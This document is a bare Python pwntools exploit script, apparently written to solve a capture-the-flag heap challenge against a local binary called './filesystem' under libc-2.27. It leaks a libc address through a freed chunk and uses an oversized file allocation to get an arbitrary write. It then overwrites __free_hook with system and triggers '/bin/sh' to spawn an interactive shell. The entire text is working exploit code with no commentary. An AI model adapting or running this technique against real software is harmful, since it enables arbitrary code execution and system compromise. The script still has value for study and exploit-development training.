from pwn import *
context.log_level = 'debug'

p = process('./filesystem',env={'LD_PRELOAD':"./libc-2.27.so"})
pause()

def menu():
    p.recvuntil('>')
    
def touch(name, type, size):
    menu()
    p.sendline('touch')
    p.sendlineafter(': ', name)
    p.sendlineafter(': ', type)
    p.sendlineafter(': ', str(size))
    
def myopen(name):
    menu()
    p.sendline('open')
    p.sendlineafter(': ', name)
    
def myseek(name, offset):
    menu()
    p.sendline('seek')
    p.sendlineafter(': ', name)
    p.sendlineafter(': ', str(offset))
    
def myread(name, size):
    menu()
    p.sendline('read')
    p.sendlineafter(': ', name)
    p.sendlineafter(': ', str(size))
    
def mywrite(name, data):
    menu()
    p.sendline('write')
    p.sendlineafter(': ', name)
    p.sendlineafter(': ', data)
    
def myclose(name):
    menu()
    p.sendline('close')
    p.sendlineafter(': ', name)
    
touch('0', 'BIN', 0x500)
myopen('0')
touch('2', 'BIN', 0x40)
#free content
myclose('0')
myopen('0')
#leak libc
myread('0', 8)
libcbase = u64(p.recvline()[0:-1].ljust(8, '\0')) - 0x3c4b78 - 0x27128
print hex(libcbase)
system = libcbase + 0x4f440
__free_hook = libcbase + 0x3ed8e8
pause()
myseek('0', 0)
mywrite('0', '/bin/sh')

touch('1', 'BIN', 0xFFFFFFFFFFFFFFFF)
myopen('1')
myseek('1', __free_hook)
mywrite('1', p64(system))

myclose('0')

p.interactive()
